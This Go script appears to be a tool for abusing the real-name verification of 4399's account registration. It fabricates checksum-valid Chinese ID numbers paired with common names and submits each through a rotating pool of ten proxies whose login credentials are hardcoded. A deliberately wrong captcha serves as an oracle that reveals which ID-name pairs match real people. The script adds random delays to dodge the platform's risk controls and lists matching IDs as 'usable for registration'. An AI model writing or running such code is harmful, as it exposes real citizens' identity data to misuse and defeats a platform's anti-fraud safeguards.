//go:build ignore

package main

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"os"
	"sync/atomic"
	"time"

	"github.com/Yeah114/g79client/account/com4399"
)

// 用户提供的10个代理池（IP:PORT 是占位符，实际由 127.0.0.1:18080 隧道协商出口）
var proxyPool = []string{
	"150.139.247.191:17303:ydl84074816:CiuEhvwj",
	"171.109.111.206:53677:ydl84074816:CiuEhvwj",
	"171.214.18.60:53589:ydl84074816:CiuEhvwj",
	"117.68.5.80:12251:ydl84074816:CiuEhvwj",
	"117.68.1.241:42687:ydl84074816:CiuEhvwj",
	"117.68.5.239:28354:ydl84074816:CiuEhvwj",
	"117.68.1.241:20539:ydl84074816:CiuEhvwj",
	"222.216.120.176:33807:ydl84074816:CiuEhvwj",
	"182.247.255.69:43405:ydl84074816:CiuEhvwj",
	"150.139.247.172:11349:ydl84074816:CiuEhvwj",
}

var regionCodes = []string{
	"110101", "310101", "440103", "440303", "330102", "320102", "510104", "420102",
	"610102", "370102", "500103", "210102", "120101", "230102", "220102", "130102",
	"410102", "430102", "360102", "350102", "530102", "520102", "450102", "460105",
}

var maleNames = []string{"王伟", "李强", "张杰", "刘洋", "陈磊", "杨帆", "赵鹏", "黄磊", "周涛", "吴强",
	"徐明", "孙浩", "马超", "朱军", "胡斌", "郭亮", "林峰", "何勇", "高飞", "罗鹏"}
var femaleNames = []string{"王芳", "李娜", "张敏", "刘静", "陈丽", "杨秀", "赵燕", "黄莉", "周雪", "吴婷",
	"徐蕾", "孙倩", "马丽", "朱琳", "胡娟", "郭颖", "林梅", "何英", "高婷", "罗霞"}

var weight = []int{7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2}
var checkCodes = []byte{'1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2'}

func genSFZ(region string, birthY int, birthM int, birthD int, male bool) string {
	s := region
	s += fmt.Sprintf("%04d%02d%02d", birthY, birthM, birthD)
	seq := rand.Intn(900) + 100
	if male && seq%2 == 0 {
		seq++
	} else if !male && seq%2 == 1 {
		seq++
	}
	s += fmt.Sprintf("%03d", seq)
	sum := 0
	for i := 0; i < 17; i++ {
		sum += int(s[i]-'0') * weight[i]
	}
	s += string(checkCodes[sum%11])
	return s
}

type candidate struct {
	SFZ    string
	Name   string
	Gender string
	Region string
	Birth  string
}

func genCandidates(n int) []candidate {
	list := make([]candidate, 0, n)
	used := map[string]bool{}
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for len(list) < n {
		region := regionCodes[rng.Intn(len(regionCodes))]
		y := 1988 + rng.Intn(15)
		m := 1 + rng.Intn(12)
		d := 1 + rng.Intn(28)
		male := rng.Intn(2) == 0
		var name string
		if male {
			name = maleNames[rng.Intn(len(maleNames))]
		} else {
			name = femaleNames[rng.Intn(len(femaleNames))]
		}
		sfz := genSFZ(region, y, m, d, male)
		if used[sfz] {
			continue
		}
		used[sfz] = true
		gender := "男"
		if !male {
			gender = "女"
		}
		list = append(list, candidate{
			SFZ:    sfz,
			Name:   name,
			Gender: gender,
			Region: region,
			Birth:  fmt.Sprintf("%04d-%02d-%02d", y, m, d),
		})
	}
	return list
}

func main() {
	rand.Seed(time.Now().UnixNano())
	N := len(proxyPool) // 10 个 = 代理数
	cands := genCandidates(N)

	log.Printf("===== 批量 SFZ+姓名 实名校验（串行+轮询代理+无重试）=====")
	log.Printf("样本数: %d, 每个用不同代理出口, DisableRiskRetry=true", N)
	log.Printf("判定: 返回「验证码错误/用户名已存在」= 实名通过 ✓ ; 返回 wrong idcard = 失败 ✗")
	fmt.Println()

	var okN, wrongN, riskN, otherN int32
	type rec struct {
		idx     int
		cand    candidate
		proxyNo int
		state   string
		err     string
	}
	results := make([]rec, N)

	for i, cand := range cands {
		proxyNo := i % len(proxyPool)
		proxyStr := proxyPool[proxyNo]

		// 抖动间隔 8~14 秒，降低风控
		jitter := 8 + rand.Intn(7)
		if i > 0 {
			log.Printf("[%2d/%2d] 等待 %d 秒后发起下一个请求（前序间隔抖动）", i+1, N, jitter)
			time.Sleep(time.Duration(jitter) * time.Second)
		}

		log.Printf("[%2d/%2d] 测试 代理#%d | SFZ=%s | 姓名=%s(%s) | 出生=%s | 地区=%s",
			i+1, N, proxyNo+1, cand.SFZ, cand.Name, cand.Gender, cand.Birth, cand.Region)

		rt, err := com4399.ParseProxyString(proxyStr)
		if err != nil {
			results[i] = rec{i, cand, proxyNo, "PARSE_ERR", err.Error()}
			atomic.AddInt32(&otherN, 1)
			continue
		}

		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
		suffix := time.Now().UnixNano() % 10000000
		req := &com4399.DirectRegisterRequest{
			Username:         fmt.Sprintf("sfzt%d%07d", i, suffix),
			Password:         "Aa123456",
			RealName:         cand.Name,
			IDCard:           cand.SFZ,
			Captcha:          "aaaa", // 故意错验证码
			Transport:        rt,
			DisableRiskRetry: true, // 关键：不重试，一次见分晓
		}
		_, rerr := com4399.DirectRegister(ctx, req)
		cancel()

		state := "OTHER"
		estr := ""
		if rerr != nil {
			estr = rerr.Error()
			switch {
			case contains(estr, "验证码") || contains(estr, "captcha"):
				state = "PASS_CAPTCHA"
				atomic.AddInt32(&okN, 1)
			case contains(estr, "用户名已被注册") || contains(estr, "username already exists"):
				state = "USER_EXISTS"
				atomic.AddInt32(&okN, 1)
			case contains(estr, "wrong idcard") || contains(estr, "real-name") || contains(estr, "身份证") || contains(estr, "实名异常") || contains(estr, "姓名身份证"):
				state = "WRONG_IDCARD"
				atomic.AddInt32(&wrongN, 1)
			case contains(estr, "请稍后再试") || contains(estr, "risk") || contains(estr, "风控"):
				state = "RISK"
				atomic.AddInt32(&riskN, 1)
			default:
				state = "OTHER"
				atomic.AddInt32(&otherN, 1)
			}
		}
		log.Printf("         → 结果: %s  %s", state, shortStr(estr, 120))
		results[i] = rec{i, cand, proxyNo, state, estr}
	}

	fmt.Println()
	fmt.Println("============ 最终汇总 ============")
	fmt.Printf("总样本: %d\n", N)
	fmt.Printf("  ✓ 实名通过 (返回验证码错误/用户名已存在): %d\n", okN)
	fmt.Printf("  ✗ wrong idcard (SFZ或姓名不匹配):         %d\n", wrongN)
	fmt.Printf("  ⚠️  风控 请稍后再试:                         %d\n", riskN)
	fmt.Printf("  ❓ 其他错误/解析失败:                        %d\n", otherN)
	fmt.Println()

	fmt.Println("--- ✓ 通过的 SFZ（可用于注册） ---")
	pi := 0
	for _, r := range results {
		if r.state == "PASS_CAPTCHA" || r.state == "USER_EXISTS" {
			pi++
			fmt.Printf("  #%d  %s | 姓名=%s | %s | 出生=%s | 地区码=%s\n",
				pi, r.cand.SFZ, r.cand.Name, r.cand.Gender, r.cand.Birth, r.cand.Region)
		}
	}
	fmt.Println()
	fmt.Println("--- ✗ 失败明细 ---")
	for _, r := range results {
		if r.state != "PASS_CAPTCHA" && r.state != "USER_EXISTS" {
			marker := "❌"
			if r.state == "RISK" {
				marker = "⚠️"
			} else if r.state == "OTHER" || r.state == "PARSE_ERR" {
				marker = "❓"
			}
			fmt.Printf("  %s [%s] 代理#%d | SFZ=%s | 姓名=%s | 出生=%s → %s\n",
				marker, r.state, r.proxyNo+1, r.cand.SFZ, r.cand.Name, r.cand.Birth, shortStr(r.err, 150))
		}
	}
	fmt.Fprintln(os.Stderr, "DONE")
}

func shortStr(s string, n int) string {
	if len(s) > n {
		return s[:n] + "..."
	}
	return s
}

func contains(s, sub string) bool {
	n, m := len(s), len(sub)
	if m == 0 {
		return true
	}
	if m > n {
		return false
	}
	// case-insensitive
	ls := make([]byte, n)
	for i := 0; i < n; i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		ls[i] = c
	}
	lsub := make([]byte, m)
	for j := 0; j < m; j++ {
		c := sub[j]
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		lsub[j] = c
	}
	for i := 0; i+m <= n; i++ {
		match := true
		for j := 0; j < m; j++ {
			if ls[i+j] != lsub[j] {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}
